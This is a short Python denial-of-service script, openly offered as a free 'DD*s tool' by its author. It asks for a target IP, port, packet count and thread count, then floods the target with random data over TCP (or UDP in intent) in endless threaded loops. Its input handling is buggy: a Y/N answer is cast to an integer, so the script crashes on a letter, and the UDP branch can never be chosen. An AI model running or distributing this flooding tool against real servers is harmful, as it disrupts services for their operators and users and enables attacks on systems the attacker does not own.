import random
import socket
import threading


print("         ___  ,--.--------.   _,.---._       _,.---._                   ,-.-. ,-----.--.  ")
print("  .-._ .'=.'\/==/,  -   , -\,-.' , -  `.   ,-.' , -  `.    _.-.  ,--.-./=/ ,//` ` - /==/  ")
print(" /==/ \|==|  \==\.-.  - ,-./==/_,  ,  - \ /==/_,  ,  - \ .-,.'| /==/, ||=| -|`-'-. -|==|  ")
print(" |==|,|  / - |`--`\==\- \ |==|   .=.     |==|   .=.     |==|, | \==\,  \ / ,|    | `|==|  ")
print(" |==|  \/  , |     \==\_ \|==|_ : ;=:  - |==|_ : ;=:  - |==|- |  \==\ - ' - /    | -|==|  ")
print(" |==|- ,   _ |     |==|- ||==| , '='     |==| , '='     |==|, |   \==\ ,   |     | `|==|  ")
print(" |==| _ /\   |     |==|, | \==\ -    ,_ / \==\ -    ,_ /|==|- `-._|==| -  ,/   .-','|==|  ")
print(" /==/  / / , /     /==/ -/  '.='. -   .'   '.='. -   .' /==/ - , ,|==\  _ /   /     \==\  ")
print(" `--`./  `--`      `--`--`    `--`--''       `--`--''   `--`-----' `--`--'    `-----`---` ")
print("")
print("    Tool has been made By MrRatsP#0045      ")
print("")
print("    It's Free DD*s tool and it not OP so much.")
print("")
print("    I'm releasing turk version too soon. so please Subscribe to MrRatsP")
print("")
ip = str(input("Please Enter the IP: "))
print("")
port = int(input("Please Enter The Port (17091/80): "))
print("")
choice = int(input("UDP(Y/N): "))
print("")
times = int(input("Packets: "))
print("")
threads = int(input("Threads: "))
print("")

def run():
	data = random._urandom(1024)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"[+] Sucessufly Attacked")
		except:
			print("[-] Error Founded!")




def run2():
	data = random._urandom(16)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"[+] Successfully Attacked")
		except:
			s.close()
			print("[-] Error Founded!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
